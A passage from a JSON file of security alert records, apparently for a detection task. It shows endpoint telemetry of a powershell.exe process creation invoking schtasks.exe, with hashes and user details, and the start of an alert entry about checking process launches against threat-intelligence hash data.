method\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17287074962975951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1728707496297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "20": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymyfile.exe launched by explorer.exe",
        "ini_data": [
